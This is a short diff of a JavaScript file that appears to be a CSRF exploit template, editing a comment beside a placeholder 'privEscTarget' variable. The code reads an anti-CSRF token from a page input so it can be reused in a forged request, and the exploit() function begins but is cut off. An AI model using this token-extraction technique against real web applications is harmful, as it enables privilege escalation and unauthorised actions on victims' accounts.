@@ -1,5 +1,5 @@
 //CSRF POST target
-var privEscTarget = "?"; //read and extract anti-CSRF token
+var privEscTarget = "?"; //URL here - read and extract anti-CSRF token
 var extract = document.querySelector('input[name=?]').value; //fetch token value
 
 function exploit() {
